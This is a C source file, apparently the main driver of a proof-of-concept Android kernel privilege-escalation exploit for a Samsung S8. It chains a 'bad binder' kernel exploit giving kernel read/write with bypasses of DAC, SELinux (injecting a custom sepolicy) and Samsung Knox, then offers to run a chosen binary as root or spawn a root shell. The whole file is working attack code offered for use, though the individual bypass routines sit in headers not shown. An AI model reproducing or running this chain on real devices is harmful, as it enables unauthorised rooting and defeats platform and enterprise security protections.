#include <stdio.h>
#include <unistd.h>
#include <stdbool.h>

#include "kallsyms.h"
#include "kernel_rw.h"
#include "bad_binder.h"
#include "dac_bypass.h"
#include "knox_bypass.h"
#include "selinux_bypass.h"

static void show_usage(void)
{
    printf("[!] usage: s8_poc [options]\n");
    printf("[!] -s        | pop a privileged shell\n");
    printf("[!] -p <path> | path of sepolicy to inject. if none, default policy is created\n");
    printf("[!] -r <path> | remount rootfs as r/w and copy file at <path>, execute as root\n");
}

int32_t main(int32_t argc, char *argv[])
{
    int32_t iRet = -1;
    int32_t iOpt = -1;
    bool bPopShell = false;
    char* pszSepolicyPath = NULL;
    char* pszRootExecPath = NULL;
    uint64_t pTaskStruct = 0;
    uint64_t pThreadInfo = 0;
    uint64_t pSecurityHookHeads = 0;
    uint64_t pSecurityCapableListItem = 0;
    uint64_t ulAddrLimit = USER_DS;
    bool bKernelRw = false;
    bool bDacBypass = false;

    while((iOpt = getopt(argc, argv, "sp:r:")) != -1)
    {
        switch(iOpt)
        {
            case 's':
                bPopShell = true;
                break;
            case 'p':
                pszSepolicyPath = optarg;
                break;
            case 'r':
                pszRootExecPath = optarg;
                break;
            default:
                show_usage();
                goto done;
        }      
    }

    if(!bPopShell && (NULL == pszSepolicyPath) && (NULL == pszRootExecPath))
    {
        printf("[-] error: you must select atleast one option [-s|-p|-r]\n");
        show_usage();
        goto done;
    }

    printf("[+] options are set, we're ready to go :)\n");
    printf("[!] attempting to exploit bad binder...\n");

    if(0 != do_bad_binder(&pTaskStruct, &pThreadInfo))
    {
        printf("[-] exploiting bad binder failed :(\n");
        printf("[-] kernel may not be vulnerable\n");
        printf("[-] OR exploit may require modification.\n");
        goto done;
    }

    printf("[+] exploit successful!\n");
    printf("[+] should now have kernel r/w!\n");

    bKernelRw = true;

    printf("[!] attempting to bypass dac...\n");

    if(0 != do_dac_bypass(&pSecurityHookHeads, &pSecurityCapableListItem))
    {
        printf("[-] dac bypass failed!\n");
        goto done;
    }

    printf("[+] dac bypass successful!\n");
    printf("[+] should now have dac root capabilities!\n");

    bDacBypass = true;

    printf("[!] attempting to bypass selinux...\n");

    if(0 != do_selinux_bypass(pszSepolicyPath))
    {
        printf("[-] selinux bypass failed!\n");
        goto done;
    }

    printf("[+] selinux bypass successful!\n");
    printf("[+] new sepolicy should now be in effect!\n");

    if(NULL != pszRootExecPath)
    {
        printf("[!] attempting to bypass Knox...\n");

        if(0 != do_knox_bypass(pTaskStruct, pThreadInfo, pszRootExecPath))
        {
            printf("[-] knox bypass failed!\n");

            if(NULL != pszSepolicyPath)
            {
                printf("[-] does the sepolicy contain the correct permissions?\n");
                printf("[-] try running again with default sepolicy option\n");
            }
        }

        else
        {
            printf("[+] knox bypass success!\n");
            printf("[+] your elf should be running as root.\n");
        }
    }

    if(NULL == pszSepolicyPath)
    {
        printf("[+] the default sepolicy setting was used\n");
        printf("[+] load a new sepolicy to add more permissions\n");
    }

    if(bPopShell)
    {
        printf("[+] enjoy this privieged shell :)\n");
        execlp("sh", "sh", (char*)0);
    }

done:

    if(bDacBypass)
    {
        // Restore security_capable hooks
        if(sizeof(uint64_t) != kernel_write_ulong(pSecurityHookHeads + SECURITY_CAPABLE_OFFSET, pSecurityCapableListItem))
        {
            printf("[-] warning! failed to restore security_capable hooks\n");
        }

        bDacBypass = false;
    }
    
    if(bKernelRw)
    {
        // Restore addr_limit
        if(sizeof(uint64_t) != kernel_write_ulong(pThreadInfo + ADDR_LIMIT_THREAD_INFO_OFFSET, ulAddrLimit))
        {
            printf("[-] warning! failed to restore current thread's addr_limit to its original state\n");
        }

        bKernelRw = false;
    }

    cleanup_kallsyms_tbl();

    return iRet;
}